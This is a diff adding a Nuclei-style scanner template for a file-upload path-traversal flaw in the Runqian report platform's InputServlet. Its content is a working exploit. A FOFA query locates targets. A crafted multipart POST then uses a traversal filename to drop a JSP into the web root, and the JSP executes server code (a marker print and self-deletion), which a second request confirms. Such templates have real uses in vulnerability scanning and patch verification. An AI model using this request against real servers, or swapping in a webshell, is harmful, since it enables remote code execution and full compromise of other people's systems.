@@ -1,0 +1,45 @@
+id: runqian-file-upload
+
+info:
+  name: 润乾报表平台InputServlet组件文件上传路径控制缺陷
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="润乾报表"
+      润乾报表平台InputServlet接口在处理文件上传请求时未正确校验文件路径参数，攻击者可构造特定请求上传恶意文件（如Webshell、恶意脚本），导致远程代码执行或系统权限被提升。此漏洞可能引发数据泄露、服务中断及系统被完全控制等安全风险。
+  tags: 润乾报表平台
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /InputServlet?action=12 HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=878byugbhfverkyfhbh675667
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 
+    Connection: close
+
+    --878byugbhfverkyfhbh675667
+    Content-Disposition: form-data; name="upsize"
+
+    1024
+    --878byugbhfverkyfhbh675667
+    Content-Disposition: form-data; name="file"; filename="/\..\\..\\..\NTest.jsp"
+    Content-Type: image/jpeg
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    --878byugbhfverkyfhbh675667--
+- raw:
+  - |
+    GET /NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
